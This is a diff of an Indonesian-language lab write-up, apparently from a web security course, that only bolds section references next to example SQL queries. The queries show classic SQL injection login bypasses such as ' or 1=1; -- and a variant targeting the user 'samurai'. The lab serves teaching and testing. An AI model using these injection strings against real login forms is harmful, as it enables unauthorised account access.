@@ -121,12 +121,12 @@ Lesson 5
     - `select * from accounts where username = 'samurai';-- and password = 'wrongpassword';`
     ![](/assets/lesson-5/db_query.png)
 - **Step 8**    : Mencoba hasil dari Single Quote(')
-    - `select * from accounts where username = '''  and password = '';`, dari section 8, step 2.
+    - `select * from accounts where username = '''  and password = '';`, dari **section 8, step 2**.
     - `';`, dari section 8, step 2.
-    - `select * from accounts where username = '' or 1=1; --   and password = '';`, dari section 9, step 2.
-    - `select * from accounts where username = 'samurai' and password = '' or 1=1; -- ';`, dari section 10, step 6.
+    - `select * from accounts where username = '' or 1=1; --   and password = '';`, dari **section 9, step 2**.
+    - `select * from accounts where username = 'samurai' and password = '' or 1=1; -- ';`, dari **section 10, step 6**.
     ![](/assets/lesson-5/db_query_1.png)
-    - `select * from accounts where username = 'samurai' and password = '' or (1=1 and username = 'samurai'); -- ';`, dari section 11, step 6.
+    - `select * from accounts where username = 'samurai' and password = '' or (1=1 and username = 'samurai'); -- ';`, dari **section 11, step 6**.
     ![](/assets/lesson-5/db_query_2.png)
 
 ### Proof of Lab
